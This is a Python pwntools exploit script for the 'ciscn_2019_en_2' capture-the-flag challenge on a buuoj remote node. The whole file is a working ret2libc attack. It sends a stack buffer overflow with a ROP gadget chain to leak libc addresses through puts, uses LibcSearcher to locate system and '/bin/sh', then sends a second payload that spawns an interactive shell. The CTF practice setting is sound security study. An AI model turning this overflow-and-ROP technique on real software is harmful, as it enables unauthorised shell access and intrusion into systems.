from pwn import *
from LibcSearcher import *


def ciscn_2019_en_2(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/ciscn_2019_en_2'):
    print('ciscn_2019_en_2 start')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 25811)
    target_elf = ELF(file_name)

    puts_plt = p64(target_elf.plt['puts'])
    puts_got = p64(target_elf.got['puts'])
    gets_got = p64(target_elf.got['gets'])
    encrypt_ptr = p64(target_elf.symbols['encrypt'])

    pop_ret_gadget = p64(0x400c83)  # pop rdi ; ret

    target.sendline('1')
    print(target.recv().decode('utf-8'))

    payload_1 = b'A' * 88
    # puts(*puts_got)
    payload_1 += pop_ret_gadget + puts_got + puts_plt
    # puts(*gets_got)
    payload_1 += pop_ret_gadget + gets_got + puts_plt
    # encrypt()
    payload_1 += encrypt_ptr

    target.sendline(payload_1)
    print(target.recvuntil('Ciphertext\n'))
    target.recvline()
    # puts_ptr = target.recvline()[:6]
    puts_ptr = int.from_bytes(target.recvline()[:6], 'little')
    gets_ptr = int.from_bytes(target.recvline()[:6], 'little')

    searcher = LibcSearcher('puts', puts_ptr)
    searcher.add_condition('gets', gets_ptr)

    libc_base = puts_ptr - searcher.dump('puts')
    system_ptr = p64(libc_base + searcher.dump('system'))
    bin_sh_ptr = p64(libc_base + searcher.dump('str_bin_sh'))

    payload_2 = b'A' * 88
    # system('/bin/sh')
    payload_2 += pop_ret_gadget + bin_sh_ptr + system_ptr
    target.sendline(payload_2)
    target.interactive()
    print('ciscn_2019_en_2 end')


if __name__ == '__main__':
    ciscn_2019_en_2()
